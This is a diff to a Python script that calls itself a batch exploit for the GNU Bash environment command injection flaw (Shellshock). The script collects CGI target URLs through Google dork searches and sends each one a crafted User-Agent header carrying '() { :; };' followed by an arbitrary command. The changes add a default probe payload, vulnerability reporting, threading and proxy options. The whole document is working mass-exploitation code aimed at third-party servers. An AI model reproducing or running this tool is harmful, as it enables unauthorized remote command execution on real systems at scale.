@@ -4,7 +4,7 @@ import random, sys, argparse, time
 
 
 class Exploit(threading.Thread):
-	def __init__(self, google, cmd):
+	def __init__(self, google, cmd=None):
 		self.targets = google.targets
 		self.google = google
 		self.cmd = cmd
@@ -15,14 +15,25 @@ class Exploit(threading.Thread):
 			while not self.targets.empty(): 
 				url = self.targets.get()
 				try:
-					headers = {"User-Agent":"() { :; }; " + self.cmd}
-					r = requests.get(url, headers = headers, verify = False)
-					print str(r.status_code) + " : " + url
+					if self.cmd is not None and len(self.cmd)>0:
+						headers = {"User-Agent":"() { :; }; " + self.cmd}
+					else:
+						headers = {"User-Agent" : '() { 1;}; echo -e "header\x3akbash-scaned2"'}
+					#print headers
+					r = requests.get(url, headers = headers, verify = False, timeout = 10)
+					if 'header' in r.headers and 'kbash-scaned' in r.headers['header']:
+						print "[ vulnerable ] " + url
+					else:
+						print "[ no vulnerable ] " + url[:50]
+					#print str(r.status_code) + " : " + url
 				except Exception as e:
-					print str(e) + url
+					print "[ ERROR ]" + str(e) + " " +url 
 				finally:
 					self.targets.task_done()
+
+				
 			time.sleep(0.1)
+		print "[ DEBUG ] " + self.getName() + " done"
 
 class Google(threading.Thread):
 	def __init__(self, dork, count):
@@ -55,7 +66,7 @@ class Google(threading.Thread):
 		#userAgent = 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36';
 		#headers = {"User-Agent":userAgent}
 
-		r = requests.get(url, timeout=10)
+		r = requests.get(url, timeout=10, verify = False)
 		if r.status_code == 503:
 			print "Blocked by Google!"
 
@@ -70,7 +81,7 @@ class Google(threading.Thread):
 
 
 USAGE = "exp -t thread -c page_count -e command"
-DESC  = "Batch Exploit GNU Bash Env Command Injection base on Google. Version 1.1 \n code by kingx  -   http://cih.so"
+DESC  = "Batch Exploit GNU Bash Env Command Injection base on Google. Version 2.0 \n code by kingx  -   http://cih.so"
 epilog = "License, requests, etc: https://github.com/KxCode"
 parser = argparse.ArgumentParser(usage=USAGE, description=DESC, epilog=epilog)
 parser.add_argument('-t', dest='thread_count',
@@ -86,7 +97,7 @@ parser.add_argument('-d', dest='dork',
                     default="filetype:sh inurl:cgi")
 parser.add_argument('-e', dest='cmd',
                     help="Command to Execute",
-                    default="whoami")
+                    default="")
 parser.add_argument('-p', dest='proxy',
                     help="proxy,support:socks4,socks5,http eg: socks5://127.0.0.1:1234 ")
 args = parser.parse_args()
